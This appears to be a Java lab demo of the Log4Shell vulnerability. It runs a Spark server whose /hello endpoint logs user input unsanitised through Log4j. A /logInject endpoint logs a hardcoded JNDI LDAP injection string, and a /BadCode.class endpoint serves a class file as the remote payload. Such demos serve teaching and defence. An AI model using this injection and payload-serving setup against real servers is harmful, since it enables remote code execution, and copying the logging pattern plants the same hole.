package de.predic8;

import java.io.File;
import java.nio.file.Files;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import spark.Spark;

public class HttpServer {
    static Logger log = LogManager.getLogger(Opfer.class.getName());

    public static void main(String[] args) {
        Spark.port(8081);

        Spark.get("/hello", (req, res) -> {
            String paramName = req.queryParams("name");
            log.info("hello " + paramName);
            return "hello " + paramName;
        });

        Spark.get("/logInject", (req, res) -> {
            log.info("request logInject");
            String paramName = "${jndi:ldap://localhost:10389/cn=badcode,dc=predic8,dc=de}";
            log.info("hello " + paramName);
            return "hello " + paramName;
        });

        Spark.get("/BadCode.class", (req, res) -> {
            log.info("request badCode");
            return Files.readAllBytes(new File("target/classes/BadCode.class").toPath());
        });
    }
}